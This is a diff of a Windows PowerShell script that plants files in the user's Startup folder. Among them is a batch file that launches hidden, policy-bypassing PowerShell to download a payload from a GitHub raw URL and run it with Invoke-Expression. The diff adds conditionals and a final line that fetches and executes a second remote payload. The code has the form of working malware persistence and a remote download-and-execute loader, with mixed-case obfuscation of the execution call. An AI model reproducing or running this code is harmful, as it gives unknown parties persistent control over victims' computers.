@@ -3,8 +3,13 @@ cd ~\AppData\Roaming\Microsoft\Windows\
 cd 'Start Menu'
 cd Programs
 cd Startup
+$ster=Test-Path start.bat
+$kepd=Test-Path kep.ps1
+if ($ster){
 New-Item start.bat
 Set-Content start.bat 'powershell  -w hidden -Exec ByPass -NoProfile -c (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay3.txt') | iNvokE-EXPresSIon'
+}
+if ($kepd){
 New-Item kep.ps1
 Set-Content kep.ps1 '
      while ($true) {                  
@@ -15,3 +20,5 @@ Set-Content kep.ps1 '
          }
          Start-Sleep -Seconds 30 
      }'
+}
+(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay2.txt') | iNvokE-EXPresSIon
